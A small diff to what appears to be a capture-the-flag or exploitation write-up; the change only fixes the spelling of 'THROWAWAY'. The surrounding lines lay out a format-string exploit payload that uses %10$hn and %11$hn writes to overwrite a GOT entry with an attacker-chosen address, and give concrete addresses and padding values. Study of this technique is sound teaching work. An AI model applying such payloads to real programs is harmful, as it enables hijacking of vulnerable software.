@@ -62,7 +62,7 @@ aaaabbbbb0x616161610x62626262
 Which translates to:
 `(GOT ADDR LO BYTES ADDR | GOT ADDR HI BYTES ADDR ) ` +
 `(( % PADDING | LO BYTES OF PWN ADDR - 8 | THROWAWAY CONV) | ( % SRC | 10TH VALUE IN STACK | $hn WRITE 2 BYTES))` +
-`(( % PADDING | HI BYTES OF PWN ADDR - LO BYTES | THROAWAY CONV) | (% SRC | 11TH VAL IN STACK | $hn WRITE 2 BYTES))`
+`(( % PADDING | HI BYTES OF PWN ADDR - LO BYTES | THROWAWAY CONV) | (% SRC | 11TH VAL IN STACK | $hn WRITE 2 BYTES))`
 
 Which should give us before conversions
 `(0x80497E0 + 0x80497E2) + ( %(0xDD74-8)$x + %10$hn ) + ( %(0xFFFF-DD74)$x  + %11$hn)`
